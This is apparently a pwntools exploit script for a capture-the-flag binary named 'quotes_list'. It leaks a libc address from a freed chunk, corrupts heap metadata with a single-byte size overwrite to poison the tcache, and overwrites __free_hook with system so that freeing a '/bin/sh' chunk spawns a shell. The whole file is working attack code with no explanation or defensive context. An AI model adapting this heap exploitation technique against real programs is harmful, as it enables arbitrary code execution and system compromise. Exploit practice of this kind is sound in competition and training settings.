from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

name = "./quotes_list"
bin = ELF(name)
libc = ELF("./libc.so.6")

conn = process(name)
gdb.attach(conn)

def menu(ch, idx = None):
  conn.recvuntil("Exit")
  conn.sendline(str(ch))
  if idx is not None:
    conn.recvuntil("Index: ")
    conn.sendline(str(idx))

def create(l, content):
  menu(1)
  conn.recvuntil("Length:")
  conn.sendline(str(l))
  conn.recvuntil("Content: ")
  conn.send(content)

def edit(idx, content):
  menu(2, idx)
  conn.recvuntil("Content: ")
  conn.send(content)

def show(idx):
  menu(3, idx)
  conn.recvuntil("Quote: ")

def delete(idx):
  menu(4, idx)

# Leaking libc
create(0x3000, "a")
create(0x3000, "b")
delete(0)
create(0x3000, "a"*8)

show(0)
conn.recvn(8)
libc_leak = u64(conn.recvn(6) + "\x00\x00")
libc.address = libc_leak - 0x7fea1a8d5ca0 + 0x7fea1a527000

delete(0)
delete(1)

# tcache poison
create(0x28, "a") # 0
create(0x28, "b") # 1
create(0x38, "c") # 2
edit(0, "a"*0x28 + "\x51")
delete(1)
delete(2)
create(0x48, "\x00"*8*5 + p64(0x41) + p64(libc.symbols['__free_hook'])) # 1
create(0x38, "/bin/sh\x00") # 2
create(0x38, p64(libc.symbols['system'])) # 3

delete(2)

log.info("Libc leak: " + hex(libc_leak))

conn.interactive()
